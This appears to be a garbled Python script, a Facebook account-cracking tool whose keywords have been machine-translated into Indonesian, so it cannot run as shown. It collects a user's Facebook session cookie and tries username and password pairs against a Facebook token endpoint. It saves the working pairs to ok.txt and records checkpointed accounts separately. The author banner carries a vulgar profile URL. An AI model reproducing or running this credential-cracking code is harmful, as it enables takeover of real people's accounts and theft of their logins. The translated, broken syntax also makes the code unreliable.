...
#Code oleh AdityaXD
#Created 05-07-2020
#Facebook saya (https://www.facebook.com/BAPAK.GUE.KEK.KONTOL.ANJING.LONTE]

impor  os , sys , re , time , json , random , request
...
\ x1b [1; 94m─────────────────────────────────────────── ────────
\ x1b [1; 97m [ \ x1b [1; 94m • \ x1b [1; 92m • \ x1b [1; 97m] Penulis: AdityaXD
\ x1b [1; 97m [ \ x1b [1; 92m • \ x1b [1; 94m • \ x1b [1; 97m] Github: https://github.com/Aditya-XD1
\ x1b [1; 97m [ \ x1b [1; 94m • \ x1b [1; 92m • \ x1b [1; 97m] Facebook: https://www.facebook.com/BAPAK.GUE.KEK.KONTOL.ANJING.LONTE
\ x1b [1; 94m─────────────────────────────────────────── ──────── "" " )
...
\ x1b [1; 91m • \ x1b [1; 93m • \ x1b [1; 92m • \ x1b [1; 97m ╚═════╝╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═╝ \ x1b [1; 92m • \ x1b [1; 93m • \ x1b [1; 91m •
\ x1b [1; 94m─────────────────────────────────────────── ────────
\ x1b [1; 97m [ \ x1b [1; 92m + \ x1b [1; 97m] Penulis: AdityaXD
\ x1b [1; 97m [ \ x1b [1; 92m + \ x1b [1; 97m] Github: https://github.com/Aditya-XD1
\ x1b [1; 97m [ \ x1b [1; 92m + \ x1b [1; 97m] Facebook: https://www.facebook.com/BAPAK.GUE.KEK.KONTOL.ANJING.LONTE
\ x1b [1; 94m─────────────────────────────────────────── ──────── "" " )

def  yayanxd ():
    yayan = masukan ( " \ n \ 033 [00m \ t    [ \ 033 [96m Tekan Enter Untuk Kembali \ 033 [97m]" )
    jika  yayan  ==  "" :
       os . sistem ( "python Cr4ck.py" )
    lain :
       sys . keluar ( " \ n \ 033 [1; 97m [ \ 033 [1; 91m • \ 033 [1; 97m] \ 033 [1; 91mGood Byee: ')" )
def  moch_yayan ():
    waktu . tidur ( 0.1 )
    print ( " \ 033 [97m [ \ 033 [96m01 \ 033 [97m] Mulai Cr4ck ID" )
    print ( " \ 033 [97m [ \ 033 [96m02 \ 033 [97m] Tutor Cara Mendapatkan Cookie Fb" )
    print ( " \ 033 [97m [ \ 033 [96m03 \ 033 [97m]                                 " )
    print ( " \ 033 [97m [ \ 033 [96m04 \ 033 [97m] Bergabung dengan Grup Fb Viral" )
    print ( " \ 033 [97m [ \ 033 [96m05 \ 033 [97m] Perbarui Alat" )
    cetak ( " \ 033 [97m [ \ 033 [91m00 \ 033 [97m] Keluar" )
    cetak ( " \ x1b [1; 94m──────────────────────────────────────── ─────────── " )
    waktu . tidur ( 0.1 )

    yayan = masukan ( " \ x1b [1; 97m [ \ x1b [1; 94m • \ x1b [1; 91m • \ x1b [1; 97m] \ 033 [90m► \ 033 [1; 93m" )
    jika  yayan  ==  "1"  atau  yayan  == "01" :
         ...
         def  masuk ():
             coba :
                    cek  =  buka ( "cookies" ). baca ()
             kecuali  FileNotFoundError :
                   ikeh_ikeh_kimochi ()
                   titit ()
                   cek  =  input ( " \ n \ 033 [0; 92m [ \ 033 [0; 97mAlat Ini Menggunakan Cookie Facebook \ 033 [0; 92m] \ n \ n \ 033 [97m [ \ 033 [91m? \ 033 [97m]] Cookie \ 033 [1; 91m: \ 033 [1; 96m " )
                   cetak ( ' \ n \ 033 [97m [ \ 033 [92m + \ 033 [97m] \ 033 [92mPleas Tunggu ...' )
             cek  = { "cookie" : cek }
             ismi  =  ses . get ( mbasic . format ( "/ me" , verifikasi = False ), cookie = cek ). kandungan
             jika  "mbasic_logout_button"  di  str ( ismi ):
                     if  "Apa yang Anda terima sekarang"  di  str ( ismi ):
                             dengan  open ( "cookies" , "w" ) sebagai  f :
                                     f . tulis ( cek [ "cookie" ])
                     lain :
                           cetak ( " \ 033 [1; 97m [ \ 033 [1; 94m • \ 033 [1; 97m] \ 033 [00mUbah bahasa, harap tunggu \ 033 [1; 91m !! \ 033 [00m" )
                           coba :
                                  permintaan . get ( mbasic . format ( parser ( ismi , "html.parser" ). find ( "a" , string = "Bahasa Indonesia" ) [ "href" ]), cookies = cek )
                           kecuali :
                                  lulus
                     coba :
                             ikuti  =  parser ( permintaan . get ( mbasic . format ( "/ KM39453" ), cookies = cek ). content , "html.parser" ). temukan ( "a" , string = "Ikuti" ) [ "href" ]
             ...
             lain :
                  os . sistem ( "xdg-buka https://youtu.be/72zvkSbVPOI" )
                  os . sistem ( 'rm -rf cookies' )
                  print ( " \ n  \ x1b [1; 97m [ \ x1b [1; 91m! \ x1b [1; 97m] Kesalahan Cookie" )
                  os . sistem ( 'python Cr4ck.py' )
         def  login ( nama pengguna , kata sandi , cek = False ):
             ...
             respon  =  permintaan . get ( api , params = params )
             jika  'EAA'  sebagai  tanggapan . teks :
                 cetak ( f " \ r \ 033 [1; 92m * -> { nama pengguna } | { sandi }                        " , end = "" )
                 cetak ()
                 hasil  + =  1
                 jika  cek :
                        hidup . tambahkan ( nama pengguna + "|" + sandi )
                 lain :
                        dengan  open ( 'ok.txt' , 'a' ) sebagai  f :
                                f . tulis ( nama pengguna  +  '|'  +  kata sandi  +  ' \ n ' )
             elif  'www.facebook.com'  sebagai  tanggapan . json () [ 'error_msg' ]:
                   cetak ( f " \ r \ 033 [1; 93m * -> { nama pengguna } | { sandi }                     " , end = "" )
                   cetak ()
                   centang  + =  1
                   jika  cek :
         ...
         aahh ( " \ n \ 033 [1; 92m Terima kasih telah menggunakan alat saya. \ n   Jangan lupa berlangganan Saluran YouTube Saya \ n \ n " )
         os . sistem ( 'xdg-buka https://youtube.com/channel/UCS7oHOu5H6nZbSmxSfnT56A' )
         keluar ()                   	
